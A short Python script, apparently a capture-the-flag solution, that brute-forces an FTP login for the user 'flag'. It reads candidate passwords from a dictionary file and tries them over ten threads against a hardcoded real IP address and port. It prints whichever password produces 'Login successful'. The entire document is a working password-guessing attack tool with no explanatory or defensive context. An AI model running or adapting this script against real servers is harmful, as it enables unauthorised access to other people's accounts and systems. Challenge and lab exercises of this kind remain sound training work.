from concurrent.futures import ThreadPoolExecutor, as_completed
from socket import socket, AF_INET, SOCK_STREAM

def scan(password, username):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(('114.55.65.251', 21212))
    sock.send(('USER %s\r\n' % username).encode())
    result = sock.recv(1024)
    if 'Please specify the password' in result.decode():
        sock.send(('PASS %s\r\n' % password).encode())
        result = sock.recv(1024)
        if 'Login successful' in result.decode():
            sock.close()
            return password
    sock.close()
    return None

def read_dict(file):
    with open(file)as fp:
        return [line.strip() for line in fp.readlines()]

if __name__ == "__main__":
    dict_filename = 'dict.txt'
    user="flag"

    executor = ThreadPoolExecutor(max_workers=10)

    tasks = [executor.submit(scan, pwd, user) for pwd in read_dict(dict_filename)]

    for future in as_completed(tasks):
        ret = future.result()
        if ret:
            print(ret)